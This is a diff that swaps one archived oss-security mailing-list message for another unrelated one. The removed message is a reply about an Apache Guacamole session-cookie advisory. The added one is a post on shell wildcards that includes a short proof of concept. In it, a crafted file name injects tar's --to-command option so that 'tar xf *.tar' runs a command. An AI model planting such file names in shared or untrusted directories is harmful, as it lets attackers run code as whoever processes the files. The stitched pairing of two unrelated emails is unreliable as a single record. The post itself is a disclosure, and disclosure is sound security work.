@@ -1,59 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/02/02/1
-Message-ID: <20190202081226.GA25332@eldamar.local>
-Date: Sat, 2 Feb 2019 09:12:26 +0100
-From: Salvatore Bonaccorso <carnil@...ian.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/12/09/1
+Message-ID: <CAGUWgD-yn2kf3T69ri7ahcCfKm=kiMBnxeb84mnH-qqYWQNUdg@mail.gmail.com>
+Date: Mon, 9 Dec 2019 15:23:16 +0200
+From: Georgi Guninski <gguninski@...il.com>
 To: oss-security@...ts.openwall.com
-Cc: Mike Jumper <mjumper@...che.org>
-Subject: Re: CVE-2018-1340: Apache Guacamole: Secure flag missing from session cookie
+Subject: Shell wildcards considered dangerous?
 Content-Type: text/plain; charset=utf-8
 
-Hi Mike,
+Remote version of this affects wu-ftpd from 2003:
+https://www.debian.org/security/2003/dsa-377
 
-On Fri, Feb 01, 2019 at 07:24:48PM -0800, Mike Jumper wrote:
-> On Fri, Feb 1, 2019, 04:27 Salvatore Bonaccorso <carnil@...ian.org wrote:
-> 
-> > Hi Mike,
-> >
-> > On Wed, Jan 23, 2019 at 02:21:30PM -0800, Mike Jumper wrote:
-> > > CVE-2018-1340: Secure flag missing from Apache Guacamole session cookie
-> > >
-> > > Versions affected:
-> > > Apache Guacamole 0.9.4 through 0.9.14
-> > >
-> > > Description:
-> > > Prior to 1.0.0, Apache Guacamole used a cookie for client-side storage
-> > > of the user's session token. This cookie lacked the "secure" flag,
-> > > which could allow an attacker eavesdropping on the network to
-> > > intercept the user's session token if unencrypted HTTP requests are
-> > > made to the same domain.
-> > >
-> > > Mitigation:
-> > > Users of Apache Guacamole 0.9.14 or older should upgrade to 1.0.0.
-> > >
-> > > Credit:
-> > > We would like to thank Ross Golder for reporting this issue.
-> >
-> > Would it be possible to confirm, is this
-> > https://issues.apache.org/jira/browse/GUACAMOLE-549
-> > https://github.com/apache/guacamole-client/commit/884a9c0ee987f9cb49a69
-> > ?
-> >
-> 
-> That is the correct JIRA issue, yes, however there are multiple relevant
-> commits.
-> 
-> With respect to the security aspect of the changes, the relevant pull
-> request is:
-> 
-> https://github.com/apache/guacamole-client/pull/273
-> 
-> There are other relevant pull requests, though they deal mainly with
-> eliminating cookies entirely:
-> 
-> https://github.com/apache/guacamole-client/pulls?utf8=%E2%9C%93&q=is%3Apr+is%3Aclosed+GUACAMOLE-549
+Summary:  For trusted command PROGRAM, executing
+PROGRAM *.EXT
+may lead to arbitrary code execution, e.g. for
+PROGRAM=EXT=tar
 
-Thanks a lot!
+The main idea is the wildcard to add program options.
 
-Regards,
-Salvatore
+Open problem:
+
+Are popular programs other than tar vulnerable?
+
+Since shell wildcards are unlikely to change, should best practice
+include not using *.EXT in shell?
+
+
+Example exploit vector: starting program in untrusted
+directories.
+
+Poc:
+====
+$rm -rf /tmp/1 ;mkdir /tmp/1 ; cd /tmp/1 ; tar cf a.tar /etc/issue
+$ : >  --to-command="yes .tar"
+
+#end creating, starts PoC
+tar xf *.tar
+
+#.tar (repeats)
+====
+
+
+-- 
+CV:    https://j.ludost.net/resumegg.pdf
+site:  http://www.guninski.com
+blog:  https://j.ludost.net/blog
